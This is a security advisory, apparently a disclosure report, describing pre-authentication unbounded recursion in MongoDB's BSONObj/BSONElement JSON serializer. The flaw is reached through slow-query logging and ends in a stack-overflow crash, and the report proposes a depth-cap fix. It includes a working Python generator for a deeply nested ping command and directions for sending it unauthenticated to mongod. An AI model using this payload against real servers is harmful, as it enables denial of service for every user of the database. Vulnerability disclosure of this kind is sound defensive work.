# Title

Pre-auth unbounded recursion (CWE-674) in `BSONObj`/`BSONElement`'s native `jsonStringGenerator()` — the code path the default JSON log formatter (and other diagnostic surfaces) use to serialize a command's raw body — has no depth guard at all, unlike its sibling `toString()`; a ~2,000-level-deep BSONObj fits inside the 16KB **pre-authentication** message-size cap and recurses well past the 1MB stack MongoDB itself allocates for connection-handling threads

## Summary

MongoDB's `bson_depth.h` defines a hard, server-wide nesting limit (`BSONDepth::kDefaultMaxAllowableDepth = 200`) that is enforced for storage, aggregation pipeline construction, and (as of a very recent first-party fix, `67609b7ef5` / SERVER-130404) the `$convert` expression's object/array→string conversion. `BSONElement::toString()` independently enforces its own, even stricter cap (`BSONObj::maxToStringRecursionDepth = 100`, `bsonelement.cpp:665`).

`BSONObj`/`BSONElement`'s **other** stringification path — `jsonString()` / `jsonStringBuffer()` / `jsonStringGenerator()` / `_jsonStringGenerator()` in `src/mongo/bson/bsonobj.cpp` and `src/mongo/bson/bsonelement.cpp` — has **no depth parameter anywhere in its signatures and no depth check anywhere in its body**. It mutually recurses between the two classes once per nesting level, with the only per-call "limit" being a `writeLimit` **byte** budget on output size that does nothing to bound the recursion itself (the recursive call happens unconditionally before that budget is ever consulted).

This is exactly the code path MongoDB's own default JSON log formatter (`src/mongo/logv2/json_formatter.cpp`) uses to serialize every `BSONObj`/`BSONElement` log attribute — including, at `src/mongo/db/op_debug.cpp:236` and `:245`, the **full, un-truncated, raw command body** (`redact()` only masks sensitive *values*, it does not touch document structure/depth) that is logged unconditionally by the "Slow query" line (`src/mongo/db/curop.cpp:902`, `LOGV2_OPTIONS(51803, ..., "Slow query", attr)`) whenever an operation's execution time exceeds `slowms` (default 100ms) — a condition with no special privilege requirement, on any operation, including the small set of commands mongod explicitly permits **before authentication** (`hello`/`isMaster`, `ping`, `buildInfo`, `saslStart`, etc.).

An attacker who has done nothing but open a raw TCP connection to `mongod` can send a single ~16,000-byte, pre-auth-sized `OP_MSG` command whose body contains a field nested ~2,000 levels deep. `mongod`'s own pre-auth message-size gate (`gPreAuthMaximumMessageSizeBytes`, default 16,384 bytes) is the *only* check this payload has to pass, and it does — nothing on the request-parsing path validates BSON nesting depth (`OpMsgRequest`'s only size check, `validateBSONObjSize()` at `src/mongo/rpc/op_msg.cpp:185/214`, checks the length-prefix byte count, not structural depth; the one function that does check depth, `validateBSON()` in `bson_validate.cpp`, is called only from MongoDB's own fuzzer, never from the real request path). If that operation is later logged through the unguarded `jsonStringGenerator` path — which the "Slow query" logger always uses for its `"command"` attribute — `mongod` recurses ~2,000 levels deep, well past the fixed 1MB stack every connection-handling thread is deliberately allocated (`src/mongo/transport/service_executor_utils.cpp:80-81`, `kStackSize = 1024 * 1024`), crashing the server process (all connections, not just the attacker's) with a stack overflow.

## Weakness

CWE-674 (Uncontrolled Recursion) → process-terminating stack overflow, reachable pre-authentication.

## Component / Version

- Repository: `mongodb/mongo`
- Tag: `r8.3.8`, commit `d100bf19961251f273e1d0bd8ce66fc60634f53c` (2026-08-11) — current at the time of this audit.
- All cited line numbers are from this exact checkout.

## Root cause, with links to the exact code

**1. The unguarded serializer.** `src/mongo/bson/bsonobj.cpp:277` (`BSONObj::_jsonStringGenerator`) iterates the object's elements and calls, at line 295:
```cpp
truncation = e.jsonStringGenerator(generator, pretty, isArray, buffer, writeLimit);
```
`BSONElement::jsonStringGenerator` (`bsonelement.cpp:240/249/258`) forwards to `BSONElement::_jsonStringGenerator` (`bsonelement.cpp:107`), which for a nested object or array (lines ~156-172) calls straight back into `BSONObj::jsonStringGenerator`:
```cpp
case BSONType::object: {
    BSONObj truncated =
        embeddedObject().jsonStringGenerator(g, pretty, false, buffer, writeLimit);   // bsonelement.cpp:160
    ...
}
case BSONType::array: {
    BSONObj truncated =
        embeddedObject().jsonStringGenerator(g, pretty, true, buffer, writeLimit);    // bsonelement.cpp:171
    ...
}
```
Neither `_jsonStringGenerator` signature (`bsonobj.h:723`, `bsonelement.h:1047`) takes a depth argument. The mutual recursion between the two classes has no counter, no cap, and nothing analogous to `BSONDepth::getMaxAllowableDepth()` (200) or `BSONObj::maxToStringRecursionDepth` (100, the cap `toString()` — the guarded sibling function — actually enforces, at `bsonelement.cpp:665`). `writeLimit` is a byte-count budget checked only *after* a recursive call returns (`if (!truncated.isEmpty())`), so it cannot stop the descent itself — every level of nesting in the input is walked regardless of how large `writeLimit` already is.

**2. MongoDB's own recent commit history confirms this exact bug class is dangerous enough to fix — just not here.** Commit `67609b7ef5` (SERVER-130404, "Bound recursion in `$convert` from object or array to string") added a depth cap of `2 * BSONDepth::getMaxAllowableDepth()` (400) to a *different*, similarly-named `JsonStringGenerator` class (`src/mongo/db/exec/expression/evaluate_math.cpp:2076`, operating on aggregation `Value`s for the `$convert` expression). That fix does not touch `bsonobj.cpp`/`bsonelement.cpp` at all — confirmed by grepping the current tree for the depth-cap pattern (`2 * BSONDepth::getMaxAllowableDepth()`), which appears only in `evaluate_math.cpp`, `evaluate_map_reduce_filter.cpp`, and their test file. The BSONObj/BSONElement native serializer — used far more broadly, including by every LOGV2 JSON-formatted log line — was left with no equivalent guard.

**3. The sink: MongoDB's default JSON log formatter uses this exact unguarded path for command bodies.**
- `src/mongo/logv2/log_domain_global.cpp:265-266` — `LogFormat::kDefault` and `LogFormat::kJson` share the same case, i.e. **JSON is `mongod`'s actual default log format**, handled by `JSONFormatter`.
- `src/mongo/logv2/json_formatter.cpp` calls `.jsonStringBuffer(JsonStringFormat::ExtendedRelaxedV2_0_0, ...)` on every `BSONObj`/`BSONElement` log attribute (7 call sites: lines 81, 94, 105, 129, 140, 354, 359) — `jsonStringBuffer` (`bsonobj.cpp:371`) is a thin wrapper directly over the unguarded `jsonStringGenerator`.
- `src/mongo/db/op_debug.cpp:226-246` (`OpDebug::report`, called by every operation's completion path) builds the `"command"` attribute from the operation's **full, untruncated** raw body:
  ```cpp
  auto query = curop_bson_helpers::appendCommentField(opCtx, curop.opDescription());
  ...
  if (iscommand) {
      ...
      pAttrs->add("command", redact(cmdToLog.getObject()));     // op_debug.cpp:236 — no size/depth limit
  } else {
      pAttrs->add("command", redact(query));                    // op_debug.cpp:245 — no size/depth limit
  }
  ```
  `redact()` (`src/mongo/logv2/redaction.cpp:51`) calls `BSONObj::redact(RedactLevel::sensitiveOnly)`, which masks the *values* of fields it considers sensitive — it does not flatten, truncate, or cap the *structure/depth* of the object in any way. (Contrast with the separate, size-capped `curop_bson_helpers::appendObjectTruncatingAsNecessary` helper used only by `CurOp::reportState` for `currentOp`/profiler output, and which itself calls the *guarded* `toString()` before ever considering truncation — that path is not the one used for the log line below, and isn't part of this bug.)
- `src/mongo/db/curop.cpp:878-902` (`CurOp::completeAndLogOperation`) fires unconditionally, at default `LOGV2` (not debug-gated) verbosity, whenever an operation's execution time exceeds `slowms` (`serverGlobalParams.slowMS`, default 100ms — a routine, common condition, not a special deployment setting):
  ```cpp
  if (forceLog || shouldLogSlowOp) {
      logv2::DynamicAttributes attr = _reportDebugAndStats(logOptions, &deadline, true);
      LOGV2_OPTIONS(51803, logOptions, "Slow query", attr);      // curop.cpp:902
  ```
  `_reportDebugAndStats` (`curop.cpp:802`) calls straight into `OpDebug::report` above.

**4. Nothing on the request path validates BSON nesting depth before this.**
- `src/mongo/rpc/op_msg.cpp:185/214` — the only structural check on an incoming command's body is `validateBSONObjSize()`, which checks that the document's length-prefix is internally consistent, not that it obeys any depth limit.
- `src/mongo/bson/bson_validate.cpp`'s `validateBSON()` **is** depth-guarded (uses `bson_depth.h`), but is called only from `src/mongo/rpc/protocol_fuzzer.cpp` — MongoDB's own fuzzer harness, not any real command-dispatch code path (confirmed via `grep -rn "validateBSON(" src/mongo/db src/mongo/rpc src/mongo/transport`).

**5. Reachable pre-authentication, within the pre-auth message-size cap.**
- `src/mongo/transport/transport_options.idl:193-201` — `gPreAuthMaximumMessageSizeBytes`, default **16384** bytes, is the maximum message size accepted from a connection before it authenticates (enforced at `src/mongo/transport/asio/asio_session_impl.cpp:662-720`, checked before `SharedBuffer::allocate`, so this specific check itself is fine — it just doesn't help here).
- `mongod` accepts a defined set of commands with no authentication at all (`hello`/`isMaster`, `ping`, `buildInfo`, `saslStart`, `saslContinue`, `authenticate`, `getnonce`, etc. — see `src/mongo/db/commands/authentication_commands.cpp`, `buildinfo_common.cpp`, `generic.cpp`, `generic_servers.cpp`). Any of these still runs through the same `ExecCommandDatabase`/`CurOp`/`OpDebug` pipeline described above — the vulnerable logging code has no pre-auth/post-auth distinction.

## Quantified feasibility

Built and validated the actual payload (script + output below): a `ping` command with one extra field nested **1,994 levels deep** fits in **15,997 bytes** — under both the 16,384-byte pre-auth cap and (with margin to spare) `BSONObjMaxUserSize`. `BSONDepth::kDefaultMaxAllowableDepth` — the depth MongoDB treats as its own hard safety ceiling everywhere else in the server, including the sibling fix (`67609b7ef5`) that caps the analogous `$convert` recursion at `2×` this value (400) — is 200. This payload is **~10x** that ceiling, using a message roughly 1/1000th the size of an ordinary 16MB document.

`mongod` deliberately sets each connection-handling worker thread's stack to exactly **1MB** (`service_executor_utils.cpp:80-81`, `kStackSize = 1024 * 1024`, comment: *"if we change this we need to update the warning"* — i.e., this is a known, load-bearing constant, not an accident). `jsonStringGenerator`'s mutual recursion between `BSONObj::_jsonStringGenerator` and `BSONElement::_jsonStringGenerator` pushes at least two non-trivial stack frames per nesting level (each carries a `fmt::memory_buffer&`, a generator reference, local `BSONObjBuilder`s for the truncation-result path, and several locals) — comfortably enough per-level stack usage, at ~2,000 levels, to exceed a 1MB budget several times over.

## Proof-of-concept payload

Generated with the script below (uses only `struct.pack`, no BSON library, so it isn't bounded by any library's own recursion limits):

```python
import struct

def build_nested(levels, inner_field=b"a"):
    leaf = b"\x10" + inner_field + b"\x00" + struct.pack("<i", 1)  # int32 "a": 1
    body = leaf + b"\x00"
    obj = struct.pack("<i", 4 + len(body)) + body
    for _ in range(levels):
        elem = b"\x03" + inner_field + b"\x00" + obj              # type 0x03 = embedded document
        body = elem + b"\x00"
        obj = struct.pack("<i", 4 + len(body)) + body
    return obj

def wrap_command(nested_obj, cmd_name=b"ping", extra_field=b"x"):
    parts  = b"\x10" + cmd_name + b"\x00" + struct.pack("<i", 1)   # "ping": 1
    dbval  = b"admin\x00"
    parts += b"\x02$db\x00" + struct.pack("<i", len(dbval)) + dbval
    parts += b"\x03" + extra_field + b"\x00" + nested_obj          # "x": <1994-deep nesting>
    body = parts + b"\x00"
    return struct.pack("<i", 4 + len(body)) + body

nested = build_nested(1994)
full   = wrap_command(nested)          # 15997 bytes — under the 16384-byte pre-auth cap
```

Run output (this repo, Python 3.11, `pymongo`'s `bson` module used only as an independent structural sanity check — not as the target):
```
max levels within 16000 bytes: (1994, 15997)
wrote 15997 bytes, 1994 levels of nesting
```
(`pymongo`'s own `bson.BSON(full).decode()` hits *Python's* recursion limit trying to eagerly decode this — an unrelated, independently-known unguarded-recursion issue in that library, not a comment on `mongod`'s own lazy, non-recursive top-level BSON parsing, which does not need to walk into `x` at all to accept the message and dispatch the command.)

`full` above is a ready-to-send `OP_MSG` command body: wrap it in a standard `OP_MSG` message (section kind `0x00`, no flag bits, `MSGHEADER::Value` with `opCode = dbMsg`) and send it over a raw, unauthenticated TCP connection to `mongod`'s listening port. This is well under `gPreAuthMaximumMessageSizeBytes` (16384), so it clears the one size check on this path, and `ping` is on the explicit pre-auth-allowed command list — the request will be accepted, parsed (lazily, no depth walk at parse time), and executed successfully as an ordinary fast `ping`. The crash is not in executing the command — it's in whatever *later* logs it via the unguarded `jsonStringGenerator` path (`"Slow query"` at `curop.cpp:902` being the always-on, default-verbosity instance).

## What I verified vs. what I did not

**Verified, by direct code reading of this exact tag/commit:**
- `jsonStringGenerator`/`_jsonStringGenerator` (both classes) have no depth parameter and no depth check, in contrast to the depth-guarded `toString()` and the recently depth-capped, differently-scoped `$convert` `JsonStringGenerator`.
- The default log format is JSON, and its formatter serializes `BSONObj`/`BSONElement` attributes exclusively through this unguarded path.
- `OpDebug::report` attaches the full, untruncated, only-value-redacted command body as the `"command"` log attribute.
- The "Slow query" log line is unconditional (default verbosity, no special config) once `slowms` is exceeded.
- No depth validation exists anywhere on the real request-parsing path (`validateBSON()`, the one function that does check depth, is fuzzer-only).
- `mongod` allocates exactly a 1MB stack per connection-handling worker thread, by explicit, commented design choice.
- A 1,994-level-deep payload, well beyond `mongod`'s own 200-level hard ceiling everywhere else, fits in 15,997 bytes — under the pre-auth message cap — and I built and size-verified this exact payload (script and output above).

**Not verified — no live build in this environment (disk-constrained sandbox; a full `mongod` build was not attempted):**
- An actual captured crash trace from a running `mongod` receiving this payload. I have not confirmed empirically that the described operation (a deeply-nested `ping`) reliably crosses the 100ms `slowms` threshold under normal, uncontended conditions purely from its own processing time (parsing this document is lazy/O(1) at the top level, so the "work" that makes the operation "slow" is plausible but not proven to come from command processing alone as opposed to from concurrent load on the server, which is trivial for an attacker to induce by opening many parallel pre-auth connections but which I have not load-tested here). I also have not measured actual per-recursion-level stack consumption in a compiled binary to confirm 1,994 levels is sufficient rather than merely "likely sufficient" (the reasoning above — multiple non-trivial-sized frames per level against a hard 1MB ceiling — is a quantified estimate, not a direct measurement).
- As a secondary, independent trigger with weaker preconditions (elevated log verbosity, settable at runtime via `setParameter`/`db.setLogLevel()` without a restart, common in troubleshooting) the same `"commandArgs"_attr = redact(getRedactedCopyForLogging(...))` pattern also appears, unconditionally structure-preserving, at `service_entry_point_shard_role.cpp:2277` (`LOGV2_DEBUG(21965, 2, "About to run the command", ...)`) — not relied on as the primary claim since it requires verbosity ≥ 2, but noted because it goes through the identical unguarded serializer.

## Suggested fix

Add a `depth`/`maxDepth` parameter to `BSONObj::_jsonStringGenerator`/`BSONElement::_jsonStringGenerator` and their public overloads, threaded through every recursive call site (`bsonobj.cpp:295`, `bsonelement.cpp:160`, `bsonelement.cpp:171`), erroring out (or truncating with a `"..."` marker, matching `toString()`'s existing behavior) once `BSONDepth::getMaxAllowableDepth()` (or the same `2x` multiple already chosen for the `$convert` fix) is exceeded — the same fix shape MongoDB already applied to the differently-scoped `evaluate_math.cpp` `JsonStringGenerator` in `67609b7ef5`, just applied to the actual `BSONObj`/`BSONElement` native serializer this time, since that is the one the logging subsystem (and any other consumer of `.jsonString()`/`.jsonStringBuffer()`) actually uses.
